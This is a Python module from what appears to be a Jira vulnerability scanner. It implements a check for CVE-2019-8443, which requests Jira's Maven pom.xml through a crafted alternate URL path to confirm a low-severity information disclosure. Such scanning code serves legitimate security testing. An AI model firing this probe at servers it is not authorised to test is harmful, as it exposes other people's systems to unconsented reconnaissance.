#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity


class CVE20198443(Exploit):
    cve = "CVE-2019-8443"
    severity = Severity.LOW
    description = "Jira Maven POM disclosure via alternate path"

    def check(self) -> bool:
        r = self.client.get(
            f"{self.target}/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
        )
        return r.status_code == 200 and "<project" in r.text

    def exploit(self) -> None:
        print(Style.CYAN("[*] Alternate POM file path is accessible"))
